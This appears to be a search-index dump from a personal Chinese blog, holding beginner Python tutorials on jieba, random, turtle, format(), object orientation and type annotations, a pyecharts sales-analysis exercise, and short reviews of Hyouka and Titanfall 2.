数据 openpyxl 处理 Excel 表格 python-docx 处理 word 文档 beautifulsoup4 解析和处理 HTML、XML 数据可视化 库名 描述 matplotlib 二维图绘制 TVTK 三维可视化 mayavi 更方便的三维可视化 用户图形界面 库名 描述 PyQt5 用户图形界面开发 wxPython 用户图形界面开发 PyGTK 用户图形界面开发 机器学习 库名 描述 scikit-learn 机器学习 TensorFlow 人工智能 Theano 深度学习 Web 开发 库名 描述 Django Web 框架 Pyramid Web 框架 Flask Web 框架 游戏开发 库名 描述 Pygame 多媒体制作 Panda3D 3D 引擎 cocos2d 2D 引擎 其他第三方库 库名 描述 PIL 图像处理 SymPy 数学计算 NLTK 自然语言处理 WeRoBot 微信机器人框架 MyQR 二维码 ","date":"2026-01-14T13:49:25+08:00","permalink":"https://www.retr0.xyz/p/11.5-%E5%85%B6%E4%BB%96%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/","title":"11.5 其他第三方库"},{"content":" Jieba是Python中广泛使用的中文分词工具，支持多种分词模式、自定义词典、关键词提取等功能，适用于自然语言处理任务。\n常用函数 函数名 描述 lcut(s) 精确模式，返回一个列表类型 lcut(s, cut_all=True) 全模式，返回一个列表类型 lcut_for_search(s) 搜索引擎模式，返回一个列表类型 add_word(w) 向分词词典中增加新词 w 用法示例 精确模式 1 2 3 4 import jieba as j ls = j.lcut(\u0026#39;毕业并不代表着结束,今后我们仍然是朋友\u0026#39;) print(ls) # 输出：[\u0026#39;毕业\u0026#39;, \u0026#39;并\u0026#39;, \u0026#39;不\u0026#39;, \u0026#39;代表\u0026#39;, \u0026#39;着\u0026#39;, \u0026#39;结束\u0026#39;, \u0026#39;,\u0026#39;, \u0026#39;今后\u0026#39;, \u0026#39;我们\u0026#39;, \u0026#39;仍然\u0026#39;, \u0026#39;是\u0026#39;, \u0026#39;朋友\u0026#39;] 精确模式下 jieba 会按照字典对输入的文本进行处理，并将完整的语句分割为若干字词，添加到一个列表中。\n全模式 1 2 3 4 import jieba as j ls = j.lcut(\u0026#39;欢迎报考南京信息工程大学\u0026#39;,cut_all=True) print(ls) # 输出：[\u0026#39;欢迎\u0026#39;, \u0026#39;报考\u0026#39;, \u0026#39;南京\u0026#39;, \u0026#39;信息\u0026#39;, \u0026#39;信息工程\u0026#39;, \u0026#39;工程\u0026#39;, \u0026#39;大学\u0026#39;] 全模式下 jieba 会按照字典对输入的文本进行处理，只要有匹配的字词就添加到列表中，所以会有重复的部分。\n搜索引擎模式 1 2 3 4 5 6 7 import jieba as j ls = j.lcut_for_search(\u0026#39;国家计算机二级考试Python学科\u0026#39;) print(ls) # 输出：[\u0026#39;国家\u0026#39;, \u0026#39;计算\u0026#39;, \u0026#39;算机\u0026#39;, \u0026#39;计算机\u0026#39;, \u0026#39;二级\u0026#39;, \u0026#39;考试\u0026#39;, \u0026#39;Python\u0026#39;, \u0026#39;学科\u0026#39;] ls = j.lcut(\u0026#39;国家计算机二级考试Python学科\u0026#39;,cut_all=True) print(ls) # 输出：[\u0026#39;国家\u0026#39;, \u0026#39;家计\u0026#39;, \u0026#39;计算\u0026#39;, \u0026#39;计算机\u0026#39;, \u0026#39;算机\u0026#39;, \u0026#39;二级\u0026#39;, \u0026#39;考试\u0026#39;, \u0026#39;Python\u0026#39;, \u0026#39;学科\u0026#39;] 通过与全模式对比可知搜索引擎模式是把全模式执行后的一些长词进一步分割。\n词典添加新词 1 2 3 4 5 6 7 8 9 10 import jieba as j ls = j.lcut(\u0026#39;小华为了派蒙恬去守长城\u0026#39;,cut_all=True) print(ls) # 输出：[\u0026#39;小\u0026#39;, \u0026#39;华为\u0026#39;, \u0026#39;为了\u0026#39;, \u0026#39;派\u0026#39;, \u0026#39;蒙恬\u0026#39;, \u0026#39;去\u0026#39;, \u0026#39;守\u0026#39;, \u0026#39;长城\u0026#39;] j.add_word(\u0026#39;小华\u0026#39;) j.add_word(\u0026#39;为了\u0026#39;) j.add_word(\u0026#39;派蒙\u0026#39;) ls = j.lcut(\u0026#39;小华为了派蒙恬去守长城\u0026#39;,cut_all=True) print(ls) # 输出：[\u0026#39;小华\u0026#39;, \u0026#39;华为\u0026#39;, \u0026#39;为了\u0026#39;, \u0026#39;派蒙\u0026#39;, \u0026#39;蒙恬\u0026#39;, \u0026#39;去\u0026#39;, \u0026#39;守\u0026#39;, \u0026#39;长城\u0026#39;] ","date":"2026-01-13T21:01:28+08:00","permalink":"https://www.retr0.xyz/p/11.4-jieba%E5%BA%93/","title":"11.4 jieba库"},{"content":"《冰菓》从不是一部追求跌宕反转的推理番，它更像一杯温吞的茶，在日常的琐碎里，泡出了属于每个 “节能主义者” 的青春心事。\n我总在折木奉太郎身上看见自己的影子。奉行 “不必要的事不做，必要的事尽快做” 的准则，把自己的大学生活过成了低饱和度的灰色 —— 懒得争抢综测加分的名额，不愿参与热闹却无意义的聚餐，只想缩在自己的舒适区里，安静地过完每一天。这份 “节能”，是对无意义内卷的逃避，也是对消耗自我的抗拒。可就像折木被那句 “我很好奇” 打破防线一样，我们总会被身边人的热情裹挟着，偶尔走出灰色地带：或许是被室友拉去完成一次小组作业，或许是为了一件真正在意的小事，心甘情愿地 “浪费” 一次精力。《冰菓》从不会批判这种 “节能”，它只是温柔地告诉我们，灰色的青春从不是残缺，它也能被旁人的玫瑰色光芒，晕染出淡淡的色彩。\n而福部里志的挣扎，更像一记精准的叩问，敲在了每个被同辈压力困住的人心上。他自诩 “数据库”，满脑子的知识却从不肯主动推理 —— 因为他清楚，自己永远追不上折木的天赋。这像极了大学里的我们：看着身边人拿奖学金、闯竞赛、保研上岸，而自己只能站在原地，陷入 “为什么我这么普通” 的自我怀疑。里志的纠结，是我们每个人都曾有过的困境：不甘于平凡，却又无力追上天才的脚步。但《冰菓》最动人的地方，在于它没有给里志一个 “逆袭成天才” 的俗套结局，而是让他慢慢接纳了自己的 “普通”。原来不必成为光芒万丈的人，做一个能为朋友的成就真心喝彩、能在自己的领域里自得其乐的 “数据库”，也很好。\n这就是《冰菓》的温柔。它不谈热血的逆袭，也不讲空洞的鸡汤，只是借着日常里的细碎推理，告诉每个奉行节能主义的人：不必强迫自己变成玫瑰色，也不必因平凡而自卑。成长，本就是在灰色与玫瑰色之间找到平衡，在接纳自己的同时，慢慢与这个世界和解。\n其实最后的告白是我最没有感触的...不过很好看就是了","date":"2026-01-12T21:52:35+08:00","image":"https://free.picui.cn/free/2026/01/12/6964fc23be24f.jpg","permalink":"https://www.retr0.xyz/p/%E5%8A%A8%E7%94%BB%E7%9F%AD%E8%AF%84%E5%86%B0%E8%8F%937/10%E4%BA%8E%E7%81%B0%E8%89%B2%E9%9D%92%E6%98%A5%E9%87%8C%E4%B8%8E%E8%87%AA%E5%B7%B1%E6%B8%A9%E6%9F%94%E5%92%8C%E8%A7%A3/","title":"[动画短评]《冰菓》7/10：于灰色青春里，与自己温柔和解"},{"content":"基本语法 函数名 描述 seed(a = None) 初始化随机数种子，默认值为当前系统时间 random() 生成一个[0.0，1.0)之间的随机小数 randint(a,b) 生成一个[a，b]之间的整数 getrandbits(k) 生成一个 k 比特长度的随机整数 randrange(start,stop,step) 生成一个[start， stop)之间以 step(可省，默认是1) 为步长的随机整数 uniform(a, b) 生成一个[a，b]之间的随机小数 choice(seq) 从序列类型（例如列表）中随机返回一个元素 shuffle(seq) 将原序列类型中元素随机排列打乱 sample(pop, k) 从 pop 中随机选取 k 个元素，以列表类型返回 用法解释 种子的作用 seed(a = None)可以在生成随机数之前设定一个种子（相当于设定了算法），因此当种子相同时产生的随机数也相同，例如：\n1 2 3 4 5 6 7 8 9 10 import random as r r.seed(23) print(r.random())\t# 输出：0.9248652516259452 print(r.random())\t# 输出：0.9486057779931771 print(r.random())\t# 输出：0.8924333440485793 r.seed(23) print(r.random())\t# 输出：0.9248652516259452 print(r.random())\t# 输出：0.9486057779931771 print(r.random())\t# 输出：0.8924333440485793 列表相关 1 2 3 4 5 6 import random as r ls = [1,2,3,4,5,6] print(r.choice(ls)) r.shuffle(ls) print(ls) print(r.sample(ls,3)) ","date":"2026-01-12T10:30:34+08:00","permalink":"https://www.retr0.xyz/p/11.3-random%E5%BA%93/","title":"11.3 random库"},{"content":"《泰坦陨落 2》的单人剧情，是一部将机甲射击的爽感与细腻情感完美糅合的杰作。它没有冗长的铺垫，仅凭明快的节奏与紧凑的关卡设计，就把玩家拽入了充满速度与火力的未来战场。\n而贯穿全程的 “协议三：保护铁驭” ，绝非一句冰冷的程序指令。它从游戏开篇的机械提示，逐渐沉淀为贯穿战斗与抉择的精神锚点，每一次响起都带着直击人心的重量。当铁驭与泰坦的配合从生疏走向默契，这句指令也从任务守则，变成了足以撼动玩家心绪的承诺，让这场机甲冒险超越了单纯的射击体验，多了一份直击心底的震撼。\n游戏的关卡设计堪称教科书级别，铁驭的飞檐走壁、钩爪滑铲与泰坦的厚重火力形成绝妙互补，每一场战斗都兼具策略性与爽快感。扣去的 1 分，仅源于流程长度与世界观拓展的些许遗憾，但这丝毫不影响它成为 FPS 爱好者的必玩之作。\n归根结底，《泰坦陨落 2》的单人剧情之所以难忘，恰是因为 “协议三：保护铁驭” 这句台词 —— 它让冰冷的机甲，拥有了足以温暖人心的重量。而这一切动人的塑造，离不开制作人文斯・赞佩拉对叙事与玩法平衡的精准把控，是他让一句简短的程序指令，化作了 FPS 史上最具穿透力的情感符号。\n这位被誉为 “FPS 界最锋利的剑” 的传奇制作人，于 2025 年 12 月因车祸猝然离世，享年 55 岁。从《使命召唤》系列奠定现代军事 FPS 的标杆，到创立重生娱乐打造《泰坦陨落》《Apex 英雄》等现象级作品，再到临危受命让《战地》系列重回巅峰，他用数十年职业生涯定义了 FPS 的核心玩法与叙事范式。他的锋利，在于总能打破品类同质化的桎梏，让射击游戏既保有酣畅爽感，又承载深刻情感，而《泰坦陨落 2》的剧情神作地位，正是这份锋利创作力的最佳佐证。\n🕯️ Press F to Pay Respects 🕯️\n笔者通关于2026年1月11日23点55分。\n","date":"2026-01-12T00:22:40+08:00","image":"https://free.picui.cn/free/2026/01/12/6964553eea4c1.jpg","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E7%9F%AD%E8%AF%84%E6%B3%B0%E5%9D%A6%E9%99%A8%E8%90%BD29/10%E4%B8%80%E5%8F%A5%E6%8C%87%E4%BB%A4%E9%93%B8%E5%B0%B1-fps-%E5%8F%99%E4%BA%8B%E7%9A%84%E6%83%85%E6%84%9F%E4%B8%B0%E7%A2%91/","title":"[游戏短评]《泰坦陨落2》9/10：一句指令，铸就 FPS 叙事的情感丰碑"},{"content":"函数介绍 窗体函数 1 turtle.setup(width,height,startx,starty) 参数介绍：\nwidth: 窗口宽度\nheight: 窗口高度\nstartx : 窗口与屏幕左侧距离（单位像素）\nstarty: 窗口与屏幕顶部距离（单位像素）\n画笔运动函数 函数名 函数别名（如有） 函数参数 功能描述 forward(distance) fd(distance) distance：数值（像素数） 控制画笔沿当前朝向向前移动指定距离，distance为负数时等效向后移动 backward(distance) bk(distance)/back(d) distance：数值（像素数） 控制画笔沿当前朝向向后移动指定距离，distance为负数时等效向前移动 right(angle) rt(angle) angle：数值（角度数，默认角度制） 控制画笔绕自身中心向右（顺时针） 旋转指定角度 left(angle) lt(angle) angle：数值（角度数，默认角度制） 控制画笔绕自身中心向左（逆时针） 旋转指定角度 goto(x, y) setpos(x,y)/setposition(x,y) x,y：数值（坐标值） 将画笔移动到画布指定坐标(x,y)位置，画笔处于“落下”状态时会绘制移动轨迹 setx(x) - x：数值（横坐标值） 仅修改画笔的横坐标为x，纵坐标保持不变，移动时画笔状态决定是否画线 sety(y) - y：数值（纵坐标值） 仅修改画笔的纵坐标为y，横坐标保持不变，移动时画笔状态决定是否画线 setheading(angle) - angle：数值（角度数，默认角度制） 设置当前朝向为angle角度 home() - 无 将画笔移回画布初始位置(0,0)，并将画笔朝向重置为初始方向（朝东） circle(radius, e, steps) - radius：数值（半径）；e：数值（圆弧角度，默认360）；steps：数值（边数） 绘制圆形/圆弧/正多边形： 1. radius正负控制旋转方向（正：逆时针，负：顺时针） 2. e指定圆弧角度（360为整圆） 3. steps指定多边形边数（模拟圆） dot(size, color) - size：数值（圆点直径，默认取画笔宽度和1的最大值）；color：字符串（颜色值） 在画笔当前位置绘制一个实心圆点，可指定直径和颜色 undo() - 无 撤销上一次的画笔操作（包括运动、绘图、状态修改等） speed(speed) - speed：0-10的整数/字符串 设置画笔移动速度： 1. 0：最快（无动画）；1：最慢；10：较快 2. 也可传\u0026quot;fast\u0026quot;/\u0026ldquo;slow\u0026quot;等字符串 画笔状态函数 参数解释：\nwidth 画笔粗细\n画笔设置 设置画笔粗细 pensize() 设置画笔颜色 pencolor()可以填颜色单词('red')或(r,g,b)值 注：原版的color的rgb值只支持0~1之间太难用了，建议再前面插入代码colormode(255)开启255颜色模式（0~255），例如(224, 223, 225)\n抬起画笔 penup()或pu()或up() 落下画笔 pendown()或pd()或down() 注：抬起和落下画笔适用于你想在画布上移动画笔但是又不想留下移动的痕迹时\n填充操作 填充前调用 begin_fill()\t放在开始画轮廓之前 设置画笔和填充颜色 color()放在画完轮廓之后 填充后调用 end_fill()\t跟在color()之后 例如：\n1 2 3 4 5 6 7 8 9 10 11 import turtle as t t.setup(600,600,10,20) t.pensize(4) t.colormode(255) t.pencolor(254, 223, 225) t.begin_fill() for i in range(4): t.forward(100) t.left(90) t.color(41, 183, 203) t.end_fill() 重置操作 清空画布但画笔位置状态 clear() 清空画笔并重置画笔状态（包括位置、颜色等）reset() 其他 在画笔位置打印文字 write() ","date":"2026-01-11T23:12:51+08:00","permalink":"https://www.retr0.xyz/p/11.2-turtle%E5%BA%93%E7%BB%98%E5%9B%BE/","title":"11.2 turtle库绘图"},{"content":"接下来会暂停一段时间Python第二阶段(S2)内容的更新，敬请谅解。\nformat() 方法的基本使用 基本语法：模板字符串.format(参数列表)\n模板字符串是一个由字符串和槽组成的字符串，用来控制字符串和变量的显示效果。\n槽用{}表示，与format()中的参数列表顺序对应。\n例如：\n1 2 print(\u0026#39;{}说：今天天气不错！\u0026#39;.format(\u0026#39;小明\u0026#39;)) # 输出：小明说：今天天气不错！ 又或者我们有多个参数：\n1 2 print(\u0026#39;{}说：今天天气{}！\u0026#39;.format(\u0026#39;小明\u0026#39;,\u0026#39;不好\u0026#39;)) # 输出：小明说：今天天气不好！ 你也可以手动指定参数，只需在{}中填写参数列表中的参数下标，例如：\n1 2 print(\u0026#39;{1}说：今天天气{0}！\u0026#39;.format(\u0026#39;小明\u0026#39;,\u0026#39;不好\u0026#39;)) # 输出：不好说：今天天气小明！ 如果不指定参数下标的话，槽的数量和顺序务必和参数列表中的参数对应，否则将会报错。\n1 2 3 4 5 6 #你不能写: #print(\u0026#39;{}说：今天天气{}！\u0026#39;.format(\u0026#39;小明\u0026#39;)) #但可以写： print(\u0026#39;{0}说：今天天气{0}！\u0026#39;.format(\u0026#39;小明\u0026#39;)) # 输出：小明说：今天天气小明！ format() 方法的格式控制 上一节中我们学习了在{}中可以留空或者填写参数下标号，\n语法格式：{参数序号:格式控制标记}\n常见的格式控制标记有下面几种 （按从前到后顺序排列） ：\n格式化配置项 解释 简单示例 填充 用于填充的单个字符 print('{:*\u0026gt;10}'.format('5')) → 输出：*********5（用*填充，总宽度10） 对齐 \u0026lt; 左对齐、\u0026gt; 右对齐、^ 居中对齐 print('{:^10}'.format('5')) → 输出： 5 （居中对齐，总宽度10） 宽度 槽的设定输出宽度 print('{:25}'.format('你好')) → 输出：你好 （总宽度25） , 数字的千位分割符，适用于整数和浮点数 print('{:,}'.format(1234567)) → 输出：1,234,567（千位分隔） 精度 浮点数小数部分的精度或字符串的最大输出长度 print('{:.2f}'.format(3.1415)) → 输出：3.14（保留2位小数，f是类型控制符） 类型 整数类型（b/c/d/o/x/X）、浮点数类型（e/E/f/%） print('{:.1%}'.format(0.75)) → 输出：75.0%（转为百分比格式，保留1位小数） 一个用上全部控制符的例子：\n1 2 print(\u0026#39;{:*^25,.2%}\u0026#39;.format(123456.7890123)) # 输出: *****12,345,678.90%****** 你也可以在槽中嵌套，像是这样：\n1 2 3 4 a = \u0026#39;TEST\u0026#39; b = \u0026#39;*\u0026#39; print(\u0026#39;{0:{1}^25}\u0026#39;.format(a,b,25)) # 输出： **********TEST*********** 详解：类型控制符 整数专用类型控制符（b/c/d/o/x/X） 类型符 全称/含义 适用数据 具体规则 示例代码 输出结果 d Decimal（十进制） 整数 以十进制整数输出（整数的默认格式，可省略） print('{:d}'.format(100)) 100 b Binary（二进制） 整数 以二进制整数输出（无前缀0b） print('{:b}'.format(100)) 1100100 o Octal（八进制） 整数 以八进制整数输出（无前缀0o） print('{:o}'.format(100)) 144 x Hexadecimal（十六进制） 整数 以小写十六进制输出（无前缀0x，0-9 + a-f） print('{:x}'.format(100)) 64 X Hexadecimal（大写十六进制） 整数 以大写十六进制输出（无前缀0X，0-9 + A-F） print('{:X}'.format(100)) 64 c Character（Unicode字符） 整数 将整数转为对应的Unicode字符（仅对有效Unicode编码值生效，如65→A、97→a） print('{:c}'.format(65)) A 浮点数 / 数值通用类型控制符（e/E/f/%/g/G） 类型符 全称/含义 适用数据 具体规则 示例代码 输出结果 f Fixed-point（固定小数） 浮点数/整数 以固定小数格式输出，默认保留6位小数，可通过精度控制（如.2f保留2位） print('{:.2f}'.format(3.1415)) 3.14 e Exponential（科学计数法） 浮点数/整数 以小写e的科学计数法输出，默认6位小数（如3.14e+00） print('{:.2e}'.format(1234.56)) 1.23e+03 E Exponential（大写科学计数法） 浮点数/整数 以大写E的科学计数法输出，规则同e print('{:.2E}'.format(1234.56)) 1.23E+03 % Percent（百分比） 浮点数/整数 将数值×100后加%符号，默认6位小数，可通过精度控制 print('{:.1%}'.format(0.75)) 75.0% g General（通用格式） 浮点数/整数 自动选择f或e中更简洁的形式，自动去掉末尾无效的0，默认6位有效数字 print('{:.3g}'.format(1234.56)) 1.23e+03 G General（大写通用格式） 浮点数/整数 规则同g，但科学计数法用大写E，自动去末尾无效0 print('{:.3G}'.format(123.000)) 123 ","date":"2026-01-10T10:38:55+08:00","permalink":"https://www.retr0.xyz/p/11.1-format%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/","title":"11.1 format格式化输出"},{"content":" 本次练习中使用的文件位于：https://pan.baidu.com/s/1xpTMQtKizhUwEGI3mC9NZQ?pwd=cfc5\n任务简报 任务要求：\n某公司有两份数据文件，现需要对其进行分析处理，计算 每日的销售额 并以柱状图表的形式进行展示。\n我们打开两份文件：\n一月份数据是普通文本，使用逗号分割数据记录，从前到后分别是：日期，订单id，销售额，销售省份 二月份数据是JSON数据，同样包含（日期，订单id，销售额，销售省份） 简单分析可得，实现方法就是找到同一天的所有销售金额并且相加，具体需求就是：\n读取数据 ➡️ 设计FileReader类 封装数据对象 ➡️ 设计数据封装类 计算数据对象 ➡️ 对对象进行逻辑计算 pyecharts绘图 ➡️ 以面向对象思想重新认知pyecharts 文件读取 新建一个文件夹作为整个项目的文件夹，此处以数据案例分析为例。\n从技术层面上我们有几个步骤：\n设计一个类，可以完成数据的封装 设计一个抽象类（方便处理两种不同形式的文件），定义文件读取的相关功能，并使用子类实现具体功能 读取文件，生产数据对象 进行数据需求的逻辑计算（计算每一天的销售额） 通过PyEcharts进行图形绘制 数据封装 创建data_define.py文件，输入：\n1 2 3 4 5 6 7 8 9 class Record: def __init__(self,date,order_id,money,province): self.date = date\t# 订单日期 self.order_id = order_id\t# 订单ID self.money = money\t# 订单金额 self.province = province\t# 销售省份 def __str__(self):\t# 使用魔术方法规范输出内容方便测试 return f\u0026#39;{self.date} {self.order_id} {self.money} {self.province}\u0026#39; 文件读取 接着进行第二部，创建文件file_define.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 import json from data_define import Record class FileReader: def read_data(self) -\u0026gt; list[Record]: # 读取文件的数据，读到的每一条数据都转换为Record对象，将它们都封装到list内返回 pass class TXTReader(FileReader): def __init__(self, path): self.path = path # 定义成员变量记录文件路径 def read_data(self) -\u0026gt; list[Record]: f = open(self.path, \u0026#39;r\u0026#39;, encoding=\u0026#39;UTF-8\u0026#39;) record_list:list[Record] = [] for line in f.readlines(): line = line.strip() # 去掉输出内容中的回车换行符\\n，方便操作 data_list = line.split(\u0026#39;,\u0026#39;) record = Record(data_list[0], data_list[1], int(data_list[2]), data_list[3]) record_list.append(record) f.close() return record_list class JsonReader(FileReader): def __init__(self, path): self.path = path def read_data(self) -\u0026gt; list[Record]: f = open(self.path, \u0026#39;r\u0026#39;, encoding=\u0026#39;UTF-8\u0026#39;) record_list:list[Record] = [] for line in f.readlines(): data_dict = json.loads(line) record = Record(data_dict[\u0026#39;date\u0026#39;],data_dict[\u0026#39;order_id\u0026#39;],data_dict[\u0026#39;money\u0026#39;],data_dict[\u0026#39;province\u0026#39;]) record_list.append(record) f.close() return record_list if __name__ == \u0026#39;__main__\u0026#39;: # 文件内测试 txtreader = TXTReader(\u0026#39;T:/2011年1月销售数据.txt\u0026#39;) jsonreader = JsonReader(\u0026#39;T:/2011年2月销售数据JSON.txt\u0026#39;) list1 = txtreader.read_data() list2 = jsonreader.read_data() for l in list1: print(l) for l in list2: print(l) 数据计算 创建main.py主文件，输入下面的核心计算代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from file_define import FileReader,TXTReader,JsonReader from data_define import Record text_file_reader = TXTReader(\u0026#34;T:/2011年1月销售数据.txt\u0026#34;) jsonReader = JsonReader(\u0026#34;T:/2011年2月销售数据JSON.txt\u0026#34;) jan_data:list[Record] = text_file_reader.read_data() feb_data:list[Record] = jsonReader.read_data() # 将两个月的数据合并为1个list来存储 all_data:list[Record] = jan_data + feb_data # 数据计算核心 data_dict = {} for record in all_data: if record.date in data_dict.keys(): # 当前已有记录表，则与旧记录直接相加 data_dict[record.date] += record.money else: data_dict[record.date] = record.money print(data_dict) 可视化开发 可视化我们依旧使用pyecharts模块，这里我们修改main.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from cProfile import label from file_define import FileReader,TXTReader,JsonReader from data_define import Record \u0026#34;\u0026#34;\u0026#34;新增内容：导包\u0026#34;\u0026#34;\u0026#34; from pyecharts.charts import Bar from pyecharts.options import * from pyecharts.globals import ThemeType text_file_reader = TXTReader(\u0026#34;T:/2011年1月销售数据.txt\u0026#34;) jsonReader = JsonReader(\u0026#34;T:/2011年2月销售数据JSON.txt\u0026#34;) jan_data:list[Record] = text_file_reader.read_data() feb_data:list[Record] = jsonReader.read_data() # 将两个月的数据合并为1个list来存储 all_data:list[Record] = jan_data + feb_data # 数据计算核心 data_dict = {} for record in all_data: if record.date in data_dict.keys(): # 当前已有记录表，则与旧记录直接相加 data_dict[record.date] += record.money else: data_dict[record.date] = record.money # 可视化图标开发 bar = Bar(init_opts=InitOpts(theme=ThemeType.LIGHT)) bar.add_xaxis(list(data_dict.keys())) # 添加x轴数据 bar.add_yaxis(\u0026#34;销售额\u0026#34;,list(data_dict.values()), label_opts=LabelOpts(is_show=False)) # 添加y轴数据和视觉优化 bar.set_global_opts( title_opts=TitleOpts(title=\u0026#34;每日销售额\u0026#34;), ) bar.render(\u0026#39;每日销售额柱状图.html\u0026#39;) ","date":"2026-01-03T19:45:15+08:00","permalink":"https://www.retr0.xyz/p/s1.10-%E7%BB%83%E4%B9%A0%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E6%A1%88%E4%BE%8B/","title":"S1.10 练习：数据分析案例"},{"content":"多态（基础） 多态，指的是：多种状态，即完成某个行为时，使用不同的对象会得到不同的状态。\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Animal: def speak(self): pass class Dog(Animal): def speak(self): print(\u0026#39;汪汪汪\u0026#39;) class Cat(Animal): def speak(self): print(\u0026#39;喵喵喵\u0026#39;) def make_noise(animal:Animal):\t# 专门定义一个函数用来在传入不同参数时调用相应的对象 animal.speak() dog = Dog() cat = Cat() make_noise(dog) make_noise(cat) 从上面的示例我们可以看出，所谓多态其实就是专门定义一个函数用来在传入不同参数时调用相应的对象，\n并且其通常作用在继承关系上，这样可以做到：\n函数（方法）形参声明接收父类对象（注解用父类是因为父类一般是统称） 实际传入父类的子类对象进行工作 最终实现同一行为，不同状态 抽象类（接口） 有人可能要问，为什么上面示例代码中父类Animal的speak方法，是空实现pass\n这种设计的含义是：\n父类用来确定有哪些方法 （名称） 具体的方法实现 （内容） ，由子类决定 这种写法，就叫做抽象类（也可以称之为接口）\n抽象类： 含有抽象方法的类称之为抽象类\n抽象方法： 方法体是空实现的pass称之为抽象方法\n抽象类就好比定义一个标准，包含了一些抽象的方法，要求子类必须实现，例如：\n1 2 3 4 5 6 7 class AC:\t# 空调标准 def coll_wind(self):\t# 制冷 pass def hot_wind(self):\t# 制热 pass def swing(self):\t# 摆风 pass 接下来不同的厂家用各自的方法去实现这些标准：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 代码续 class Midea_AC(AC): def coll_wind(self):\t# 制冷 print(\u0026#39;美的制冷方案\u0026#39;) def hot_wind(self):\t# 制热 print(\u0026#39;美的制热方案\u0026#39;) def swing(self):\t# 摆风 print(\u0026#39;美的摆风方案\u0026#39;) class GREE_AC(AC): def coll_wind(self):\t# 制冷 print(\u0026#39;格力制冷方案\u0026#39;) def hot_wind(self):\t# 制热 print(\u0026#39;格力制热方案\u0026#39;) def swing(self):\t# 摆风 print(\u0026#39;格力摆风方案\u0026#39;) 接下来结合我们一开始学习的多态：\n1 2 3 4 5 6 7 8 def make_cool(ac:AC): ac.coll_wind() midea_ac = Midea_AC() gree_ac = GREE_AC() make_cool(midea_ac) make_cool(gree_ac) ","date":"2025-12-30T22:49:32+08:00","permalink":"https://www.retr0.xyz/p/s1.9-%E5%A4%9A%E6%80%81/","title":"S1.9 多态"},{"content":"类型注解 Why\u0026amp;What 为什么要使用类型注解 当我们调用random模块中的randint方法时，将光标置于括号中查看提示会显示 显然它的意思是说我们要传入一个整数int参数\n但当我们自己定义一个函数时，提示却只告诉我们任何参数any，如果这个函数是用来进行特定操作的话就容易弄错传参类型， 什么是类型注解 Python在3.5版本的时候引入了类型注解，以方便静态类型检查工具,IDE等第三方工具。\n类型注解： 在代码中涉及数据交互的地方,提供数据类型的注解（显式的说明）。\n主要功能：\n帮助第三方IDE工具（如PyCharm）对代码进行类型推断，协助做代码提示 帮助开发者自身对变量进行类型注释 支持：\n变量的类型注解 函数（方法）形参列表和返回值的类型注解 类型注解注释一个提高代码可读性的备注，写错了也不影响程序的实际运行。\n变量的类型注解 基础语法：变量:类型\n基础数据类型注解 1 2 3 4 name: str = \u0026#39;小明\u0026#39; age: int = 10 if_student: bool = True average_money: float = 10.445 基础数据类型注解 1 2 3 class Student: pass stu: Student = Student() 基础容器类型注解（简易） 简易版就是只注解容器的类型\n1 2 3 4 5 my_list:list = [1,2,3] my_tuple:tuple = (1,2,3) my_set:set = {1,2,3} my_dict:dict = {\u0026#39;retr0\u0026#39;:123} my_str:str = \u0026#39;retr0\u0026#39; 基础容器类型注解（详细） 1 2 3 4 my_list:list[int] = [1,2,3] my_tuple:tuple[str,int,boll] = (\u0026#39;retr0\u0026#39;,1,True) my_set:set[int] = {1,2,3} my_dict:dict[str,int] = {\u0026#39;retr0\u0026#39;:123} 详细注解需要注解容器内部元素的类型，并且注意：\n元组类型设置详细注解，需要将每一个元素都标记出来 字典类型设置详细注解，需要两个类型，第一个是key第二个是value 其他语法格式 还有一种注解方法就是在对应行的注释中进行类型注解，语法：# type:类型\n1 2 3 4 5 6 a = random.randint(1,10)\t# type:int # 指返回的结果是整数 b = json.loads(data)\t# type:dict[str,int] # 指返回的结果是字典 c = func()\t# type:Student # 指返回的结果是Student的类对象 并且实际上一般情况下我们不用特别对变量进行注解（毕竟我们也能一眼看出来到底是什么数据类型），真正需要注解的就是像上面这种的隐式变量，因为我们无法直接看出其数据类型。\n函数和方法的类型注解 函数（方法）的类型注解 — 形参注解 语法：\n1 2 def 函数方法名(形参名：类型，形参名：类型): 示例语句 QuickStart：\n1 2 3 4 5 def add(x:int,y:int): return x + y def func(data:list): pass 函数（方法）的类型注解 — 返回值注解 语法：\n1 2 def 函数方法名(形参名：类型，形参名：类型) -\u0026gt; 返回值类型: 示例语句 QuickStart：\n1 2 3 4 5 def add(x:int,y:int) -\u0026gt; int: return x + y def func(data:list) -\u0026gt; list: data.append(\u0026#39;test\u0026#39;) return data Union联合类型注解 为什么要有Union类型注解？ 如果数据容器是下面这样的，你还好进行一般注解吗？\n1 2 my_list = [1,2,\u0026#39;retr0\u0026#39;,\u0026#39;hello\u0026#39;] my_dict = [\u0026#39;name\u0026#39;:\u0026#39;retr0\u0026#39;,\u0026#39;age\u0026#39;:18] 使用方法 首先导入Union包from typing import Union\n语法：Union[类型,类型,......,类型]\n演示：变量注解 1 2 3 from typing import Union my_list: list[Union[int,str]] = [1,2,\u0026#39;retr0\u0026#39;,\u0026#39;hello\u0026#39;] my_dict:dict[str,Union[str,int]] = [\u0026#39;name\u0026#39;:\u0026#39;retr0\u0026#39;,\u0026#39;age\u0026#39;:18] 演示：返回值注解 1 2 3 from typing import Union def func(data:Union[int,str]) -\u0026gt; Union[int,str]: pass ","date":"2025-12-29T22:14:54+08:00","permalink":"https://www.retr0.xyz/p/s1.8-%E7%B1%BB%E5%9E%8B%E6%B3%A8%E8%A7%A3/","title":"S1.8 类型注解"},{"content":"颁奖音乐走起（只颁不奖）：\n又陷入电子 ED 